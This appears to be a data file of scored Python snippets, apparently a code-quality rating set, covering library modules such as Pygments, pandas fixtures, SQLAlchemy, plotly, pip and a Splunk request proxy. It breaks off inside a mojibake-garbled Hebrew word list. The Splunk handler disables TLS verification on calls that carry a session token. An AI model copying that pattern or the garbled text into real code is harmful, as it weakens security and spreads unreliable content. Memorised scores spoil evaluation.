# MAIN LOOP

done = False

i = 0
j = 0

r_name, r_flags = pg.display._get_renderer_info()
print(""renderer:"", r_name, ""flags:"", bin(r_flags))
for flag, name in [
    (1, ""software""),
    (2, ""accelerated""),
    (4, ""VSync""),
    (8, ""render to texture""),
]:
    if flag & r_flags:
        print(name)

while not done:
    for event in pg.event.get():
        if event.type == pg.KEYDOWN and event.key == pg.K_q:
            done = True
        if event.type == pg.QUIT:
            done = True
        if event.type == pg.KEYDOWN and event.key == pg.K_f:
            pg.display.toggle_fullscreen()
        if event.type == pg.VIDEORESIZE:
            pg.display._resize_event(event)

    i += 1
    i = i % screen.get_width()
    j += i % 2
    j = j % screen.get_height()

    screen.fill((255, 0, 255))
    pg.draw.circle(screen, (0, 0, 0), (100, 100), 20)
    pg.draw.circle(screen, (0, 0, 200), (0, 0), 10)
    pg.draw.circle(screen, (200, 0, 0), (160, 120), 30)
    pg.draw.line(screen, (250, 250, 0), (0, 120), (160, 0))
    pg.draw.circle(screen, (255, 255, 255), (i, j), 5)

    pg.display.flip()
    clock.tick(FPS)
pg.quit()"
412	adjudicated	2	"import numpy as np
import pytest

import pandas as pd
from pandas import (
    Index,
    MultiIndex,
)


# Note: identical the ""multi"" entry in the top-level ""index"" fixture
@pytest.fixture
def idx():
    # a MultiIndex used to test the general functionality of the
    # general functionality of this object
    major_axis = Index([""foo"", ""bar"", ""baz"", ""qux""])
    minor_axis = Index([""one"", ""two""])

    major_codes = np.array([0, 0, 1, 2, 3, 3])
    minor_codes = np.array([0, 1, 0, 1, 0, 1])
    index_names = [""first"", ""second""]
    mi = MultiIndex(
        levels=[major_axis, minor_axis],
        codes=[major_codes, minor_codes],
        names=index_names,
        verify_integrity=False,
    )
    return mi


@pytest.fixture
def idx_dup():
    # compare tests/indexes/multi/conftest.py
    major_axis = Index([""foo"", ""bar"", ""baz"", ""qux""])
    minor_axis = Index([""one"", ""two""])

    major_codes = np.array([0, 0, 1, 0, 1, 1])
    minor_codes = np.array([0, 1, 0, 1, 0, 1])
    index_names = [""first"", ""second""]
    mi = MultiIndex(
        levels=[major_axis, minor_axis],
        codes=[major_codes, minor_codes],
        names=index_names,
        verify_integrity=False,
    )
    return mi


@pytest.fixture
def index_names():
    # names that match those in the idx fixture for testing equality of
    # names assigned to the idx
    return [""first"", ""second""]


@pytest.fixture
def narrow_multi_index():
    """"""
    Return a MultiIndex that is narrower than the display (<80 characters).
    """"""
    n = 1000
    ci = pd.CategoricalIndex(list(""a"" * n) + ([""abc""] * n))
    dti = pd.date_range(""2000-01-01"", freq=""s"", periods=n * 2)
    return MultiIndex.from_arrays([ci, ci.codes + 9, dti], names=[""a"", ""b"", ""dti""])


@pytest.fixture
def wide_multi_index():
    """"""
    Return a MultiIndex that is wider than the display (>80 characters).
    """"""
    n = 1000
    ci = pd.CategoricalIndex(list(""a"" * n) + ([""abc""] * n))
    dti = pd.date_range(""2000-01-01"", freq=""s"", periods=n * 2)
    levels = [ci, ci.codes + 9, dti, dti, dti]
    names = [""a"", ""b"", ""dti_1"", ""dti_2"", ""dti_3""]
    return MultiIndex.from_arrays(levels, names=names)"
503	adjudicated	1	"import unittest

from nbformat import v4 as nbformat


class NBClientTestsBase(unittest.TestCase):
    def build_notebook(self, with_json_outputs=False):
        """"""Build a notebook in memory for use with NotebookClient tests""""""

        outputs = [
            nbformat.new_output(""stream"", name=""stdout"", text=""a""),
            nbformat.new_output(""display_data"", data={'text/plain': 'b'}),
            nbformat.new_output(""stream"", name=""stdout"", text=""c""),
            nbformat.new_output(""stream"", name=""stdout"", text=""d""),
            nbformat.new_output(""stream"", name=""stderr"", text=""e""),
            nbformat.new_output(""stream"", name=""stderr"", text=""f""),
            nbformat.new_output(""display_data"", data={'image/png': 'Zw=='}),  # g
            nbformat.new_output(""display_data"", data={'application/pdf': 'aA=='}),  # h
        ]
        if with_json_outputs:
            outputs.extend(
                [
                    nbformat.new_output(""display_data"", data={'application/json': [1, 2, 3]}),  # j
                    nbformat.new_output(
                        ""display_data"", data={'application/json': {'a': 1, 'c': {'b': 2}}}
                    ),  # k
                    nbformat.new_output(""display_data"", data={'application/json': 'abc'}),  # l
                    nbformat.new_output(""display_data"", data={'application/json': 15.03}),  # m
                ]
            )

        cells = [
            nbformat.new_code_cell(source=""$ e $"", execution_count=1, outputs=outputs),
            nbformat.new_markdown_cell(source=""$ e $""),
        ]

        return nbformat.new_notebook(cells=cells)

    def build_resources(self):
        """"""Build an empty resources dictionary.""""""
        return {'metadata': {}}

    @classmethod
    def merge_dicts(cls, *dict_args):
        # Because this is annoying to do inline
        outcome = {}
        for d in dict_args:
            outcome.update(d)
        return outcome"
443	adjudicated	0	"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.


import typing

from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.primitives.asymmetric.types import (
    PRIVATE_KEY_TYPES,
    PUBLIC_KEY_TYPES,
)


def load_pem_private_key(
    data: bytes,
    password: typing.Optional[bytes],
    backend: typing.Any = None,
    *,
    unsafe_skip_rsa_key_validation: bool = False,
) -> PRIVATE_KEY_TYPES:
    from cryptography.hazmat.backends.openssl.backend import backend as ossl

    return ossl.load_pem_private_key(
        data, password, unsafe_skip_rsa_key_validation
    )


def load_pem_public_key(
    data: bytes, backend: typing.Any = None
) -> PUBLIC_KEY_TYPES:
    from cryptography.hazmat.backends.openssl.backend import backend as ossl

    return ossl.load_pem_public_key(data)


def load_pem_parameters(
    data: bytes, backend: typing.Any = None
) -> ""dh.DHParameters"":
    from cryptography.hazmat.backends.openssl.backend import backend as ossl

    return ossl.load_pem_parameters(data)


def load_der_private_key(
    data: bytes,
    password: typing.Optional[bytes],
    backend: typing.Any = None,
    *,
    unsafe_skip_rsa_key_validation: bool = False,
) -> PRIVATE_KEY_TYPES:
    from cryptography.hazmat.backends.openssl.backend import backend as ossl

    return ossl.load_der_private_key(
        data, password, unsafe_skip_rsa_key_validation
    )


def load_der_public_key(
    data: bytes, backend: typing.Any = None
) -> PUBLIC_KEY_TYPES:
    from cryptography.hazmat.backends.openssl.backend import backend as ossl

    return ossl.load_der_public_key(data)


def load_der_parameters(
    data: bytes, backend: typing.Any = None
) -> ""dh.DHParameters"":
    from cryptography.hazmat.backends.openssl.backend import backend as ossl

    return ossl.load_der_parameters(data)"
484	adjudicated	1	"""""""
views.py        # Houses `SchemaView`, `APIView` subclass.

See schemas.__init__.py for package overview.
""""""
from rest_framework import exceptions, renderers
from rest_framework.response import Response
from rest_framework.schemas import coreapi
from rest_framework.settings import api_settings
from rest_framework.views import APIView


class SchemaView(APIView):
    _ignore_model_permissions = True
    schema = None  # exclude from schema
    renderer_classes = None
    schema_generator = None
    public = False

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        if self.renderer_classes is None:
            if coreapi.is_enabled():
                self.renderer_classes = [
                    renderers.CoreAPIOpenAPIRenderer,
                    renderers.CoreJSONRenderer,
                ]
            else:
                self.renderer_classes = [
                    renderers.OpenAPIRenderer,
                    renderers.JSONOpenAPIRenderer,
                ]
            if renderers.BrowsableAPIRenderer in api_settings.DEFAULT_RENDERER_CLASSES:
                self.renderer_classes += [renderers.BrowsableAPIRenderer]

    def get(self, request, *args, **kwargs):
        schema = self.schema_generator.get_schema(request, self.public)
        if schema is None:
            raise exceptions.PermissionDenied()
        return Response(schema)

    def handle_exception(self, exc):
        # Schema renderers do not render exceptions, so re-perform content
        # negotiation with default renderers.
        self.renderer_classes = api_settings.DEFAULT_RENDERER_CLASSES
        neg = self.perform_content_negotiation(self.request, force=True)
        self.request.accepted_renderer, self.request.accepted_media_type = neg
        return super().handle_exception(exc)"
477	adjudicated	3	"""""""
    pygments.styles.autumn
    ~~~~~~~~~~~~~~~~~~~~~~

    A colorful style, inspired by the terminal highlighting style.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Whitespace


class AutumnStyle(Style):
    """"""
    A colorful style, inspired by the terminal highlighting style.
    """"""

    styles = {
        Whitespace:                 '#bbbbbb',

        Comment:                    'italic #aaaaaa',
        Comment.Preproc:            'noitalic #4c8317',
        Comment.Special:            'italic #0000aa',

        Keyword:                    '#0000aa',
        Keyword.Type:               '#00aaaa',

        Operator.Word:              '#0000aa',

        Name.Builtin:               '#00aaaa',
        Name.Function:              '#00aa00',
        Name.Class:                 'underline #00aa00',
        Name.Namespace:             'underline #00aaaa',
        Name.Variable:              '#aa0000',
        Name.Constant:              '#aa0000',
        Name.Entity:                'bold #800',
        Name.Attribute:             '#1e90ff',
        Name.Tag:                   'bold #1e90ff',
        Name.Decorator:             '#888888',

        String:                     '#aa5500',
        String.Symbol:              '#0000aa',
        String.Regex:               '#009999',

        Number:                     '#009999',

        Generic.Heading:            'bold #000080',
        Generic.Subheading:         'bold #800080',
        Generic.Deleted:            '#aa0000',
        Generic.Inserted:           '#00aa00',
        Generic.Error:              '#aa0000',
        Generic.Emph:               'italic',
        Generic.Strong:             'bold',
        Generic.Prompt:             '#555555',
        Generic.Output:             '#888888',
        Generic.Traceback:          '#aa0000',

        Error:                      '#F00 bg:#FAA'
    }"
426	adjudicated	1	"""""""
Aliases for functions which may be accelerated by Scipy.

Scipy_ can be built to use accelerated or otherwise improved libraries
for FFTs, linear algebra, and special functions. This module allows
developers to transparently support these accelerated functions when
scipy is available but still support users who have only installed
NumPy.

.. _Scipy : https://www.scipy.org

""""""
# This module should be used for functions both in numpy and scipy if
#  you want to use the numpy version if available but the scipy version
#  otherwise.
#  Usage  --- from numpy.dual import fft, inv

__all__ = ['fft', 'ifft', 'fftn', 'ifftn', 'fft2', 'ifft2',
           'norm', 'inv', 'svd', 'solve', 'det', 'eig', 'eigvals',
           'eigh', 'eigvalsh', 'lstsq', 'pinv', 'cholesky', 'i0']

import numpy.linalg as linpkg
import numpy.fft as fftpkg
from numpy.lib import i0
import sys


fft = fftpkg.fft
ifft = fftpkg.ifft
fftn = fftpkg.fftn
ifftn = fftpkg.ifftn
fft2 = fftpkg.fft2
ifft2 = fftpkg.ifft2

norm = linpkg.norm
inv = linpkg.inv
svd = linpkg.svd
solve = linpkg.solve
det = linpkg.det
eig = linpkg.eig
eigvals = linpkg.eigvals
eigh = linpkg.eigh
eigvalsh = linpkg.eigvalsh
lstsq = linpkg.lstsq
pinv = linpkg.pinv
cholesky = linpkg.cholesky

_restore_dict = {}

def register_func(name, func):
    if name not in __all__:
        raise ValueError(""{} not a dual function."".format(name))
    f = sys._getframe(0).f_globals
    _restore_dict[name] = f[name]
    f[name] = func

def restore_func(name):
    if name not in __all__:
        raise ValueError(""{} not a dual function."".format(name))
    try:
        val = _restore_dict[name]
    except KeyError:
        return
    else:
        sys._getframe(0).f_globals[name] = val

def restore_all():
    for name in _restore_dict.keys():
        restore_func(name)"
368	adjudicated	0	"# mssql/__init__.py
# Copyright (C) 2005-2023 the SQLAlchemy authors and contributors
# <see AUTHORS file>
#
# This module is part of SQLAlchemy and is released under
# the MIT License: https://www.opensource.org/licenses/mit-license.php
# mypy: ignore-errors


from . import base  # noqa
from . import pymssql  # noqa
from . import pyodbc  # noqa
from .base import BIGINT
from .base import BINARY
from .base import BIT
from .base import CHAR
from .base import DATE
from .base import DATETIME
from .base import DATETIME2
from .base import DATETIMEOFFSET
from .base import DECIMAL
from .base import FLOAT
from .base import IMAGE
from .base import INTEGER
from .base import JSON
from .base import MONEY
from .base import NCHAR
from .base import NTEXT
from .base import NUMERIC
from .base import NVARCHAR
from .base import REAL
from .base import ROWVERSION
from .base import SMALLDATETIME
from .base import SMALLINT
from .base import SMALLMONEY
from .base import SQL_VARIANT
from .base import TEXT
from .base import TIME
from .base import TIMESTAMP
from .base import TINYINT
from .base import try_cast
from .base import UNIQUEIDENTIFIER
from .base import VARBINARY
from .base import VARCHAR
from .base import XML


base.dialect = dialect = pyodbc.dialect


__all__ = (
    ""JSON"",
    ""INTEGER"",
    ""BIGINT"",
    ""SMALLINT"",
    ""TINYINT"",
    ""VARCHAR"",
    ""NVARCHAR"",
    ""CHAR"",
    ""NCHAR"",
    ""TEXT"",
    ""NTEXT"",
    ""DECIMAL"",
    ""NUMERIC"",
    ""FLOAT"",
    ""DATETIME"",
    ""DATETIME2"",
    ""DATETIMEOFFSET"",
    ""DATE"",
    ""TIME"",
    ""SMALLDATETIME"",
    ""BINARY"",
    ""VARBINARY"",
    ""BIT"",
    ""REAL"",
    ""IMAGE"",
    ""TIMESTAMP"",
    ""ROWVERSION"",
    ""MONEY"",
    ""SMALLMONEY"",
    ""UNIQUEIDENTIFIER"",
    ""SQL_VARIANT"",
    ""XML"",
    ""dialect"",
    ""try_cast"",
)"
228	adjudicated	1	"""""""
    pygments.lexers.x10
    ~~~~~~~~~~~~~~~~~~~

    Lexers for the X10 programming language.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer
from pygments.token import Text, Comment, Keyword, String

__all__ = ['X10Lexer']

class X10Lexer(RegexLexer):
    """"""
    For the X10 language.

    .. versionadded:: 0.1
    """"""

    name = 'X10'
    url = 'http://x10-lang.org/'
    aliases = ['x10', 'xten']
    filenames = ['*.x10']
    mimetypes = ['text/x-x10']

    keywords = (
        'as', 'assert', 'async', 'at', 'athome', 'ateach', 'atomic',
        'break', 'case', 'catch', 'class', 'clocked', 'continue',
        'def', 'default', 'do', 'else', 'final', 'finally', 'finish',
        'for', 'goto', 'haszero', 'here', 'if', 'import', 'in',
        'instanceof', 'interface', 'isref', 'new', 'offer',
        'operator', 'package', 'return', 'struct', 'switch', 'throw',
        'try', 'type', 'val', 'var', 'when', 'while'
    )

    types = (
        'void'
    )

    values = (
        'false', 'null', 'self', 'super', 'this', 'true'
    )

    modifiers = (
        'abstract', 'extends', 'implements', 'native', 'offers',
        'private', 'property', 'protected', 'public', 'static',
        'throws', 'transient'
    )

    tokens = {
        'root': [
            (r'[^\S\n]+', Text),
            (r'//.*?\n', Comment.Single),
            (r'/\*(.|\n)*?\*/', Comment.Multiline),
            (r'\b(%s)\b' % '|'.join(keywords), Keyword),
            (r'\b(%s)\b' % '|'.join(types), Keyword.Type),
            (r'\b(%s)\b' % '|'.join(values), Keyword.Constant),
            (r'\b(%s)\b' % '|'.join(modifiers), Keyword.Declaration),
            (r'""(\\\\|\\[^\\]|[^""\\])*""', String),
            (r""'\\.'|'[^\\]'|'\\u[0-9a-fA-F]{4}'"", String.Char),
            (r'.', Text)
        ],
    }"
339	adjudicated	0	"from fontTools.misc.textTools import safeEval
from . import DefaultTable
import struct


GASP_SYMMETRIC_GRIDFIT = 0x0004
GASP_SYMMETRIC_SMOOTHING = 0x0008
GASP_DOGRAY = 0x0002
GASP_GRIDFIT = 0x0001


class table__g_a_s_p(DefaultTable.DefaultTable):
    def decompile(self, data, ttFont):
        self.version, numRanges = struct.unpack("">HH"", data[:4])
        assert 0 <= self.version <= 1, ""unknown 'gasp' format: %s"" % self.version
        data = data[4:]
        self.gaspRange = {}
        for i in range(numRanges):
            rangeMaxPPEM, rangeGaspBehavior = struct.unpack("">HH"", data[:4])
            self.gaspRange[int(rangeMaxPPEM)] = int(rangeGaspBehavior)
            data = data[4:]
        assert not data, ""too much data""

    def compile(self, ttFont):
        version = 0  # ignore self.version
        numRanges = len(self.gaspRange)
        data = b""""
        items = sorted(self.gaspRange.items())
        for rangeMaxPPEM, rangeGaspBehavior in items:
            data = data + struct.pack("">HH"", rangeMaxPPEM, rangeGaspBehavior)
            if rangeGaspBehavior & ~(GASP_GRIDFIT | GASP_DOGRAY):
                version = 1
        data = struct.pack("">HH"", version, numRanges) + data
        return data

    def toXML(self, writer, ttFont):
        items = sorted(self.gaspRange.items())
        for rangeMaxPPEM, rangeGaspBehavior in items:
            writer.simpletag(
                ""gaspRange"",
                [
                    (""rangeMaxPPEM"", rangeMaxPPEM),
                    (""rangeGaspBehavior"", rangeGaspBehavior),
                ],
            )
            writer.newline()

    def fromXML(self, name, attrs, content, ttFont):
        if name != ""gaspRange"":
            return
        if not hasattr(self, ""gaspRange""):
            self.gaspRange = {}
        self.gaspRange[safeEval(attrs[""rangeMaxPPEM""])] = safeEval(
            attrs[""rangeGaspBehavior""]
        )"
279	adjudicated	4	"""""""Pillow (Fork of the Python Imaging Library)

Pillow is the friendly PIL fork by Alex Clark and Contributors.
    https://github.com/python-pillow/Pillow/

Pillow is forked from PIL 1.1.7.

PIL is the Python Imaging Library by Fredrik Lundh and Contributors.
Copyright (c) 1999 by Secret Labs AB.

Use PIL.__version__ for this Pillow version.

;-)
""""""

from . import _version

# VERSION was removed in Pillow 6.0.0.
# PILLOW_VERSION was removed in Pillow 9.0.0.
# Use __version__ instead.
__version__ = _version.__version__
del _version


_plugins = [
    ""BlpImagePlugin"",
    ""BmpImagePlugin"",
    ""BufrStubImagePlugin"",
    ""CurImagePlugin"",
    ""DcxImagePlugin"",
    ""DdsImagePlugin"",
    ""EpsImagePlugin"",
    ""FitsImagePlugin"",
    ""FitsStubImagePlugin"",
    ""FliImagePlugin"",
    ""FpxImagePlugin"",
    ""FtexImagePlugin"",
    ""GbrImagePlugin"",
    ""GifImagePlugin"",
    ""GribStubImagePlugin"",
    ""Hdf5StubImagePlugin"",
    ""IcnsImagePlugin"",
    ""IcoImagePlugin"",
    ""ImImagePlugin"",
    ""ImtImagePlugin"",
    ""IptcImagePlugin"",
    ""JpegImagePlugin"",
    ""Jpeg2KImagePlugin"",
    ""McIdasImagePlugin"",
    ""MicImagePlugin"",
    ""MpegImagePlugin"",
    ""MpoImagePlugin"",
    ""MspImagePlugin"",
    ""PalmImagePlugin"",
    ""PcdImagePlugin"",
    ""PcxImagePlugin"",
    ""PdfImagePlugin"",
    ""PixarImagePlugin"",
    ""PngImagePlugin"",
    ""PpmImagePlugin"",
    ""PsdImagePlugin"",
    ""SgiImagePlugin"",
    ""SpiderImagePlugin"",
    ""SunImagePlugin"",
    ""TgaImagePlugin"",
    ""TiffImagePlugin"",
    ""WebPImagePlugin"",
    ""WmfImagePlugin"",
    ""XbmImagePlugin"",
    ""XpmImagePlugin"",
    ""XVThumbImagePlugin"",
]


class UnidentifiedImageError(OSError):
    """"""
    Raised in :py:meth:`PIL.Image.open` if an image cannot be opened and identified.
    """"""

    pass"
269	adjudicated	3	"# -*- coding: utf-8 -*-
""""""Payload system for IPython.

Authors:

* Fernando Perez
* Brian Granger
""""""

#-----------------------------------------------------------------------------
#       Copyright (C) 2008-2011 The IPython Development Team
#
#  Distributed under the terms of the BSD License.  The full license is in
#  the file COPYING, distributed as part of this software.
#-----------------------------------------------------------------------------

#-----------------------------------------------------------------------------
# Imports
#-----------------------------------------------------------------------------

from traitlets.config.configurable import Configurable
from traitlets import List

#-----------------------------------------------------------------------------
# Main payload class
#-----------------------------------------------------------------------------

class PayloadManager(Configurable):

    _payload = List([])

    def write_payload(self, data, single=True):
        """"""Include or update the specified `data` payload in the PayloadManager.

        If a previous payload with the same source exists and `single` is True,
        it will be overwritten with the new one.
        """"""

        if not isinstance(data, dict):
            raise TypeError('Each payload write must be a dict, got: %r' % data)

        if single and 'source' in data:
            source = data['source']
            for i, pl in enumerate(self._payload):
                if 'source' in pl and pl['source'] == source:
                    self._payload[i] = data
                    return

        self._payload.append(data)

    def read_payload(self):
        return self._payload

    def clear_payload(self):
        self._payload = []"
329	adjudicated	1	"from splunk.persistconn.application import PersistentServerConnectionApplication
import json
import requests
import logging


class request(PersistentServerConnectionApplication):
    def __init__(self, command_line, command_arg, logger=None):
        super(PersistentServerConnectionApplication, self).__init__()
        self.logger = logger
        if self.logger == None:
            self.logger = logging.getLogger(f""splunk.appserver.badmsc"")

        PersistentServerConnectionApplication.__init__(self)

    def handle(self, in_string):
        args = json.loads(in_string)

        if args[""method""] != ""POST"":
            self.logger.info(f""Method {args['method']} not allowed"")
            return {
                ""payload"": ""Method Not Allowed"",
                ""status"": 405,
                ""headers"": {""Allow"": ""POST""},
            }

        try:
            options = json.loads(args[""payload""])
        except Exception as e:
            self.logger.info(f""Invalid payload. {e}"")
            return {""payload"": ""Invalid JSON payload"", ""status"": 400}

        self.logger.info(args[""payload""])

        # Handle local requests by adding FQDN and auth token
        if options[""url""].startswith(""/services""):
            options[""verify""] = False
            options[""url""] = f""{args['server']['rest_uri']}{options['url']}""
            options[""headers""][
                ""Authorization""
            ] = f""Splunk {args['session']['authtoken']}""
        elif not (
            options[""url""].startswith(""https://"")
            or options[""url""].startswith(""http://"")
        ):
            options[""url""] = f""https://{options['url']}""

        try:
            r = requests.request(**options)
            self.logger.info(f""{r.status_code} {r.text}"")
            return {""payload"": r.text, ""status"": r.status_code}
        except Exception as e:
            self.logger.info(f""Request failed. {e}"")
            return {""payload"": str(e), ""status"": 500}"
238	adjudicated	2	"import _plotly_utils.basevalidators


class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""textfont"", parent_name=""scatterpolargl"", **kwargs):
        super(TextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
378	adjudicated	0	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .chardistribution import EUCTWDistributionAnalysis
from .codingstatemachine import CodingStateMachine
from .mbcharsetprober import MultiByteCharSetProber
from .mbcssm import EUCTW_SM_MODEL


class EUCTWProber(MultiByteCharSetProber):
    def __init__(self) -> None:
        super().__init__()
        self.coding_sm = CodingStateMachine(EUCTW_SM_MODEL)
        self.distribution_analyzer = EUCTWDistributionAnalysis()
        self.reset()

    @property
    def charset_name(self) -> str:
        return ""EUC-TW""

    @property
    def language(self) -> str:
        return ""Taiwan"""
436	adjudicated	1	"""""""xmlrpclib.Transport implementation
""""""

import logging
import urllib.parse
import xmlrpc.client
from typing import TYPE_CHECKING, Tuple

from pip._internal.exceptions import NetworkConnectionError
from pip._internal.network.session import PipSession
from pip._internal.network.utils import raise_for_status

if TYPE_CHECKING:
    from xmlrpc.client import _HostType, _Marshallable

logger = logging.getLogger(__name__)


class PipXmlrpcTransport(xmlrpc.client.Transport):
    """"""Provide a `xmlrpclib.Transport` implementation via a `PipSession`
    object.
    """"""

    def __init__(
        self, index_url: str, session: PipSession, use_datetime: bool = False
    ) -> None:
        super().__init__(use_datetime)
        index_parts = urllib.parse.urlparse(index_url)
        self._scheme = index_parts.scheme
        self._session = session

    def request(
        self,
        host: ""_HostType"",
        handler: str,
        request_body: bytes,
        verbose: bool = False,
    ) -> Tuple[""_Marshallable"", ...]:
        assert isinstance(host, str)
        parts = (self._scheme, host, handler, None, None, None)
        url = urllib.parse.urlunparse(parts)
        try:
            headers = {""Content-Type"": ""text/xml""}
            response = self._session.post(
                url,
                data=request_body,
                headers=headers,
                stream=True,
            )
            raise_for_status(response)
            self.verbose = verbose
            return self.parse_response(response.raw)
        except NetworkConnectionError as exc:
            assert exc.response
            logger.critical(
                ""HTTP error %s while getting %s"",
                exc.response.status_code,
                url,
            )
            raise"
467	adjudicated	2	"import json

from django import forms
from django.core.exceptions import ValidationError
from django.utils.translation import gettext_lazy as _

__all__ = [""HStoreField""]


class HStoreField(forms.CharField):
    """"""
    A field for HStore data which accepts dictionary JSON input.
    """"""

    widget = forms.Textarea
    default_error_messages = {
        ""invalid_json"": _(""Could not load JSON data.""),
        ""invalid_format"": _(""Input must be a JSON dictionary.""),
    }

    def prepare_value(self, value):
        if isinstance(value, dict):
            return json.dumps(value)
        return value

    def to_python(self, value):
        if not value:
            return {}
        if not isinstance(value, dict):
            try:
                value = json.loads(value)
            except json.JSONDecodeError:
                raise ValidationError(
                    self.error_messages[""invalid_json""],
                    code=""invalid_json"",
                )

        if not isinstance(value, dict):
            raise ValidationError(
                self.error_messages[""invalid_format""],
                code=""invalid_format"",
            )

        # Cast everything to strings for ease.
        for key, val in value.items():
            if val is not None:
                val = str(val)
            value[key] = val
        return value

    def has_changed(self, initial, data):
        """"""
        Return True if data differs from initial.
        """"""
        # For purposes of seeing whether something has changed, None is
        # the same as an empty dict, if the data or initial value we get
        # is None, replace it w/ {}.
        initial_value = self.to_python(initial)
        return super().has_changed(initial_value, data)"
494	adjudicated	2	"import _plotly_utils.basevalidators


class InsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""insidetextfont"", parent_name=""funnel"", **kwargs):
        super(InsidetextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Insidetextfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
453	adjudicated	0	"from node import HuffmanNode


class Huffman():

    def __init__(self, s:str) -> None:
        self.__weights = self.__get_weights(s)
        self.__buffer = [b' ' for _ in range(round(len(self.__weights)))]
        self.__tree = self.__build_huffman_tree(self.__weights)
        self.__code = self.__build_code(self.__tree)

    @property
    def weights(self):
        return self.__weights

    @property
    def tree(self):
        return self.__tree

    @property
    def code(self):
        return self.__code

    def __get_weights(self, s:str) -> dict:
        weights = dict()
        for i in s:
            weights[i] = weights.get(i, 0)+1
        return weights
    
    def __build_huffman_tree(self, weights:dict):
        nodes = [HuffmanNode(value, weight) for value,weight in weights.items()]
        while len(nodes) > 1:
            nodes.sort(key=lambda node:node.weight, reverse=True)
            c = HuffmanNode(value=None, weight=(nodes[-1].weight+nodes[-2].weight))
            c.left_node = nodes.pop()
            c.right_node = nodes.pop()
            nodes.append(c)
        return nodes[0]

    def __build_code(self, tree):
        
        def func(tree:HuffmanNode, length:int):
            nonlocal code, self
            node = tree
            if not node:
                return
            elif node.value:
                code[node.value] = b''.join( self.__buffer[:length] )
                return
            self.__buffer[length] = b'0'
            func(node.left_node, length+1)
            self.__buffer[length] = b'1'
            func(node.right_node, length+1)
        
        code = dict()
        func(tree, 0)
        return code


if __name__ == ""__main__"":
    s = ""aabbccdddeefgenajojfonadkjfwqnioaerweggrefdsfassasdfgr""

    huffman = Huffman(s)

    print(huffman.weights)
    print(huffman.code)"
513	adjudicated	1	"# coding: utf8
from __future__ import unicode_literals

from ...attrs import LIKE_NUM

_num_words = [
    ""××¤×¡"",
    ""×××"",
    ""×××ª"",
    ""×©×ª×××"",
    ""×©×ª××"",
    ""×©× ×××"",
    ""×©× ××"",
    ""×©×××©"",
    ""×©×××©×"",
    ""××¨××¢"",
    ""××¨××¢×"",
    ""×××©"",
    ""××××©×"",
    ""×©×©"",
    ""×©××©×"",
    ""×©××¢"",
    ""×©××¢×"",
    ""×©××× ×"",
    ""×ª×©×¢"",
    ""×ª×©×¢×"",
    ""×¢×©×¨"",
    ""×¢×©×¨×"",
    ""××× ×¢×©×¨"",
    ""×××ª ×¢×©×¨×"",
    ""×©× ×× ×¢×©×¨"",
    ""×©×ª×× ×¢×©×¨×"",
    ""×©×××©× ×¢×©×¨"",
    ""×©×××© ×¢×©×¨×"",
    ""××¨××¢× ×¢×©×¨"",
    ""××¨××¢ ×¢×©×¨×"",
    ""××××©× ×¢×©×¨"",
